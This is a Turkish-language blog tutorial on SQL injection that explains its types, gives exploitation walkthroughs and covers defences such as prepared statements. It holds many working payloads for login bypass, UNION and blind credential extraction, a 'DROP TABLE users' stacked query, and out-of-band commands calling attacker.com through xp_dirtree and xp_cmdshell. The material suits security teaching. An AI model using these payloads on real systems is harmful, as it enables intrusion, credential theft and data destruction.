---
layout: post
title: "SQL Injection: Türleri, Örnekler ve Korunma Yöntemleri"
date: 2025-09-22
tags: [web-security, sqli, pentest, database]
author: "07enesavci"
reading_time: true
summary: "SQL Injection nedir, çeşitleri, örnek payload'lar, tespit yöntemleri ve korunma adımları — kapsamlı rehber."
---

# SQL Injection (SQLi) Nedir?

SQL Injection (SQLi), web uygulamalarının veritabanı sorgularını kullanıcı girdisiyle doğrudan oluşturması sonucu ortaya çıkan, saldırganın veritabanına kötü amaçlı SQL kodu enjekte etmesine imkan tanıyan kritik bir zafiyettir. Hedefler bilgi sızdırma, veri manipülasyonu, kimlik doğrulama baypası veya hatta sistem ele geçirme olabilir.

> **Uyarı:** Bu makale **eğitim/CTF/izinli pentest** amaçlıdır. Hazır payload’lar ve teknikler yalnızca yetki verilen hedeflerde kullanılmalıdır. İzinsiz saldırılar yasa dışıdır.

---

## İçerik
1. SQLi türleri (In-band, Blind, OOB, Second-order, Stacked queries)  
2. Her tür için detaylı örnek payload'lar ve açıklamalar  
3. Veritabanı-özgü örnekler (MySQL, MSSQL, PostgreSQL, Oracle)  
4. Pratik istismar senaryoları (adım adım)  
5. Tespit & test yöntemleri (manuel + araçlar)  
6. Korunma/mitigasyon (kod örnekleri)  
7. İleri seviye savunma & izleme  
8. Raporlama, etik ve kaynaklar

---

## 1) SQLi Türleri (Detaylı)

SQLi genelde şu başlıklarda toplanır: **In-band (Error/Union)**, **Blind (Boolean/Time)**, **Out-of-Band (OOB)**, **Second-order** ve **Stacked queries**. Her birinin tespit ve sömürü yöntemi farklıdır.

### 1.1 In-band SQLi
Sonuçların doğrudan uygulama yanıtında görülebildiği türdür. En hızlı ve en "görünür" olan türdür.

#### Error-based SQLi
Veritabanı hata mesajları kullanılarak bilgi çıkarılır. Bazı hata mesajları tablo/kolon/versiyon bilgisi verir.

**Örnek payload’lar:**
```sql
' OR 1=1 --
' OR '1'='1' #
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version),FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) --
İkinci örnek MySQL’in hata mekanizmasını kullanarak @@version gibi verileri hata çıktısında sızdırmayı hedefler.

Nasıl çalışır?
Uygulama hata mesajlarını geliştirici modunda/verbose şeklinde döndürüyorsa, hata içinde veritabanı metadata’sı (sürüm, tablo isimleri, kolon uzunlukları) görülebilir. Prod ortamında hata detaylarını kullanıcıya göstermek büyük risk oluşturur — gizlenmelidir.

Union-based SQLi
UNION anahtar kelimesiyle orijinal sorgu ile saldırganın SELECT sorgusunun çıktısını birleştirerek veri sızdırılır.

Adımlar:

Hedef sorgudaki kolon sayısını tespit et (ORDER BY veya UNION SELECT NULL,...).

Uygun sayıda NULL veya sabit değer gir.

CONCAT() veya CHAR() ile okunabilir çıktı oluştur.

Örnek:

text
Kodu kopyala
GET /product?id=5 UNION SELECT 1, CONCAT(username,0x3a,password) FROM users --
Not: 0x3a hex olarak : karakteridir; CONCAT ile okunabilir çıktı birleştirilir.

1.2 Blind SQLi
Sayfa doğrudan veri göstermiyorsa bu teknikler kullanılır. Yavaş ama sağlam yöntemlerdir.

Boolean-based Blind
Sorguların true/false olmasıyla uygulama davranışı gözlemlenir.

Örnek (karakter-karakter sızdırma):

text
Kodu kopyala
?id=1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
Sayfa normal yükleniyorsa koşul true, farklı yanıt veriyorsa false.

Kırma yöntemi: Her karakteri tek tek test ederek veya ascii karşılaştırmalarıyla binary search yaparak hızlandır.

Time-based Blind
Koşul doğruysa veritabanına SLEEP ya da eşdeğeri yaptırılır; yanıt süresine bakılır.

MySQL örnek:

text
Kodu kopyala
?id=1' AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97, SLEEP(5), 0) --
Eğer yanıt 5 saniye gecikiyorsa koşul doğru varsayılır.

PostgreSQL örnek:

text
Kodu kopyala
?id=1' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin')--
Blind yöntemler özellikle güvenlik kontrolleri/filtreleri yüzünden doğrudan veri verilmeyen hedeflerde çok kullanışlıdır.

1.3 Out-of-Band (OOB) SQLi
Veriler doğrudan web yanıtında görünmez; veritabanı veya sunucu dışa bağlantı yapıp (DNS/HTTP) saldırganın kontrolündeki sunucuya veri gönderir.

MSSQL örnek (xp_dirtree):

sql
Kodu kopyala
'; exec master..xp_dirtree '\\attacker.com\share' --
Hedef sunucuda DNS logları veya SMB/HTTP istekleri ile sızdırılan veri görülebilir.

Avantaj: Hedef yanıt vermiyorsa veya çok kısıtlıysa bile OOB ile dış kanal bilgileri elde edilebilir. Ancak OOB için sunucunun dışa çıkış yetkisi olmalı.

1.4 Second-Order SQLi
Zararlı içerik ilk aşamada saklanır, daha sonra başka bir işlem sırasında (ör. admin raporu, arama) tetiklenir. Kayıt sırasında zararsız görünen veri daha sonraki kullanımda zararlı olabilir.

Senaryo: Kullanıcı profilindeki bio alanına test' -- girilir; admin panelinde bu değer başka bir sorguda kullanıldığında SQL kırılır.

1.5 Stacked Queries (Multiple Statements)
Aynı parametrede ; ile birden çok SQL ifadesi çalıştırılarak ikinci bir zararlı satır tetiklenir (DROP TABLE vs). Birçok modern sürücü bunu engeller ama bazı konfigürasyonlarda hâlâ çalışabilir.

Örnek:

sql
Kodu kopyala
'; DROP TABLE users; --
2) Veritabanı-Özgü Payload Örnekleri
Aşağıdaki örnekler CTF/öğrenme amaçlıdır.

2.1 MySQL
sql
Kodu kopyala
-- Basit bypass
' OR '1'='1' #

-- Versiyon çekme
' UNION SELECT NULL, @@version, NULL --

-- Time-based (karakter testi)
' AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97, SLEEP(5), 0) --
2.2 Microsoft SQL Server (MSSQL)
sql
Kodu kopyala
-- Basit bypass
' OR 1=1 --

-- Sistem veritabanları
' UNION SELECT name, NULL FROM master..sysdatabases --

-- OOB / komut çalıştırma (xp_cmdshell aktif ise)
'; EXEC xp_cmdshell 'nslookup attacker.com' --
2.3 PostgreSQL
sql
Kodu kopyala
-- Basit bypass
' OR '1'='1' --

-- Versiyon gösterme
' UNION SELECT version(), NULL --

-- Time-based (pg_sleep)
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin') --
2.4 Oracle
sql
Kodu kopyala
-- Versiyon
' UNION SELECT banner, NULL FROM v$version --

-- Error-based (TO_NUMBER ile hata ürettirme)
' AND 1=(SELECT 1 FROM dual WHERE 1=TO_NUMBER('nonumeric')) --
3) Pratik İstismar Senaryoları (Adım Adım)
Tekrar uyarı: Aşağıdaki senaryolar yalnızca izinli/CTF amaçlıdır.

Senaryo A — Login Bypass (MySQL)
Sorgu: SELECT * FROM users WHERE username = '$username' AND password = '$password';

Payload: username = ' OR 1=1 --

Sorgu SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '' olur ve genelde ilk kullanıcıyla oturum açılır.

Etki: Yetkisiz giriş (critical).

Senaryo B — Union ile kullanıcı verisi çekme
Kolon sayısını tespit et:

text
Kodu kopyala
?id=1 UNION SELECT NULL -- 
?id=1 UNION SELECT NULL,NULL -- 
Uygun kolon sayısını bulunca:

text
Kodu kopyala
?id=1 UNION SELECT id, CONCAT(username,0x3a,password) FROM users --
Senaryo C — Blind ile şifre kırma (time-based)
Her karakter için sleep denemesi:

text
Kodu kopyala
?id=1' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5), 0) --
Binary search ile ASCII aralığını daraltarak hızlandır.

4) Tespit & Test Yöntemleri
4.1 Manuel hızlı testler
Tek tırnak (') ekleyip hata gözle: ?q='

OR 1=1, OR '1'='1' ile auth bypass testi

UNION SELECT NULL,... ile kolon sayısı deneme

ORDER BY n ile kolon sayısı tespiti

4.2 Otomatik araçlar
sqlmap — tespit ve otomatik exploitation.

bash
Kodu kopyala
sqlmap -u "https://target.com/search?q=1" --risk=2 --level=3 --batch
Burp Suite — proxy, intruder, repeater, scanner.

OWASP ZAP — açık kaynaklı scanner.

4.3 Kolon sayısı bulma: pratik
ORDER BY yöntemi:

sql
Kodu kopyala
?id=1 ORDER BY 1 -- OK
?id=1 ORDER BY 2 -- OK
...
?id=1 ORDER BY 10 -- HATA -> kolon sayısı < 10
UNION yöntemi: UNION SELECT NULL, NULL, ... artan NULL sayısıyla dene.

4.4 sqlmap kullanırken dikkat
--batch otomatik onay, dikkatli kullan.

--tamper script’leri WAF’e karşı denemeler yapar (yalnızca lab).

--dbs, --tables, --dump adımlarıyla listeleme ve dökme yapılır.

5) Korunma / Mitigasyon (Kod + Pratik)
En etkili yaklaşım: parametrized queries (prepared statements) + input validation/whitelisting + least privilege + logging/monitoring.

5.1 Prepared statements (örnekler)
PHP (PDO)

php
Kodu kopyala
// Güvenli sorgu (prepared)
$stmt = $pdo->prepare("SELECT id, password_hash FROM users WHERE username = :username");
$stmt->execute([':username' => $_POST['username']]);
$user = $stmt->fetch();
Python (psycopg2)

python
Kodu kopyala
cur.execute("SELECT id, password_hash FROM users WHERE username = %s", (username,))
row = cur.fetchone()
Node.js (pg)

javascript
Kodu kopyala
const res = await client.query('SELECT * FROM users WHERE id = $1', [userId]);
Java (JDBC)

java
Kodu kopyala
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, id);
ResultSet rs = ps.executeQuery();
Prepared statements kullanıcı girdisini sorgudan ayırır — SQL yapısını manipüle edemez.

5.2 ORM kullanımı
Django ORM, SQLAlchemy, Hibernate gibi kütüphaneler parametreleştirme ve query builder kullanımı ile SQLi riskini azaltır. Yine de raw SQL kullanıyorsan prepared kullan.

5.3 Input validation & whitelisting
ID gibi numeric alanlarda int dönüşümü: filter_var($id, FILTER_VALIDATE_INT).

E-posta adreslerinde regex/validator kullan.

Beklenen karakter seti (whitelist) ile kontrol uygulanmalı.

5.4 Output encoding & hata yönetimi
Prod ortamda SQL error’larını kullanıcıya gösterme. Hataları logla ama gösterme (display_errors = Off).

XSS riskini azaltmak için çıktı escape’le.

5.5 Least privilege
Uygulama DB kullanıcılarına yalnızca gerekli izinleri ver (SELECT/INSERT/UPDATE gibi).

DDL/ADMİN komutlarını uygulama hesabından kaldır.

5.6 WAF & rate limiting
WAF ek bir katman sağlar ancak tek başına yeterli değildir.

Rate limiting ile otomasyon saldırılarını yavaşlat.

5.7 CI/CD güvenlik taramaları
Commit/merge pipeline’ına OWASP ZAP, yarı-otomatik testler ekle.

Kod review sırasında SQL kullanımına dikkat et.

6) Raporlama & Etik Kurallar
Pentester olarak:

Bulduğun zafiyeti PoC ile göster (exploit yerine PoC).

Etkiyi CVSS ile derecelendir; önerilen düzeltmeleri açıkça yaz.

Responsible disclosure uygulaması: önce vendor/ilgili kişi, sonrasında gerekli süre sonrasında gerektiğinde kamu bilgilendirmesi.

Kısa rapor örneği:

Vulnerability: SQL Injection in search parameter

PoC: https://target.com/search?q=' UNION SELECT 1, username, password FROM users --

Impact: User credential disclosure (High)

Recommendation: Use parametrized queries; sanitize inputs; rotate DB credentials; apply least privilege.

7) CTF / Eğitim İpuçları
Önce tek tırnak (') ile test et.

UNION için kolon sayısını bulun; sütun tipine dikkat et (text/int).

Blind için binary search (ASCII 0–255 bölerek) kullanarak hız kazan.

WAF varsa sqlmap --tamper script’leri denenebilir (lab ortamı).

Time-based çok yavaş olabilir; otomatikleştirirken sleep sürelerini dikkatli seç.

8) Hızlı Özet — Kullanışlı Payload’lar
' OR '1'='1' -- — Basit bypass

UNION SELECT NULL, username, password FROM users -- — Union sızdırma

AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97, SLEEP(5), 0) -- — Time blind (MySQL)

'; exec master..xp_dirtree '\\attacker.com\share' -- — OOB (MSSQL)

9) İleri Seviye Savunma & İzleme
Database Activity Monitoring (DAM) ile anormal sorguları tespit et.

Zentralize logging: tüm SQL error/exception ve şüpheli pattern’ları topla.

Uygulama ve DB tarafında anomaly detection (ör. normalin dışındaki sorgu kalıpları).

Düzenli pentest ve kod incelemesi.

Sonuç
SQL Injection günümüzde hâlâ sık rastlanan, etkileri ağır olabilen bir zafiyettir. Geliştiriciler için en basit ve etkili kurallar: kullanıcı girdisine güvenme, parametrized queries kullan, least privilege uygula ve hata detaylarını gizle. Güvenlik ekipleri için de otomatik + manuel test kombinasyonu, CI entegrasyonu ve düzenli pentest şart.

Kaynaklar & İleri Okuma
OWASP SQL Injection Cheat Sheet

sqlmap documentation

Burp Suite docs

PostgreSQL / MySQL / MSSQL / Oracle resmi dökümantasyonları

"The Web Application Hacker's Handbook" (pratik referans)
